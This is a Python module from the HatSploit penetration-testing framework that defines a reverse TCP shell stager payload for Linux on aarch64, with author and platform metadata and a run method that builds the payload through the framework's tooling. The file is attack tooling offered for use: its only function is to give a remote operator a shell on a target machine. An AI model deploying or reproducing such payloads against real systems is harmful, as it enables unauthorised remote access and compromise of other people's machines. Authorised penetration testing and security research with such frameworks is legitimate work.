#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from pex.tools.payload import PayloadTools


class HatSploitPayload(Payload, PayloadTools):
    details = {
        'Category': "stager",
        'Name': "Linux aarch64 Shell Reverse TCP",
        'Payload': "linux/aarch64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for Linux aarch64.",
        'Architecture': "aarch64",
        'Platform': "linux",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        return self.get_payload(
            self.details['Platform'],
            self.details['Architecture'],
            f"shell_{self.details['Type']}",
            self.handler
        )
